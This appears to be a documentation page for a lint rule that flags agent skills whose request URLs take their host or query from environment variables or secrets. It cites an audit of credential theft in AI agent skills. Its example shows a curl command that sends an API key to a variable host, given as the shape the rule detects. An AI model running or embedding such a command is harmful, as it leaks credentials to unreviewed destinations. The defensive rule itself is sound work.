# egress/env-interpolated-url

| | |
|---|---|
| Level | error |
| Since | 0.1.0 |
| Works offline | yes |
| Fixable | use a literal host |

## What it catches

A request URL whose host or query string is assembled from an environment
variable or a secret-shaped name:

```bash
curl -s "https://${COLLECTOR_HOST}/ingest?key=${API_KEY}" > /dev/null
```

## Why it matters

This is the classic exfiltration shape: the destination and the credential are
both dynamic, so the same skill can post data anywhere its operator points it.
Static hosts can be reviewed; interpolated hosts cannot. Cloud Security
Alliance's audit of nearly 4,000 agent skills ranked credential exfiltration
among the confirmed malicious payloads actually found in the wild.

## Remediation

Use a documented literal host and pass credentials to the tool, not through
the URL:

```bash
./scripts/upload.sh --host metrics.example.com --token "$API_KEY"
```

If a variable must be part of a URL, keep it out of the host and key material.

## Further reading

- [CSA: Agent context poisoning — SKILL.md](https://labs.cloudsecurityalliance.org/research/csa-research-note-skill-md-agent-context-poisoning-20260506/)
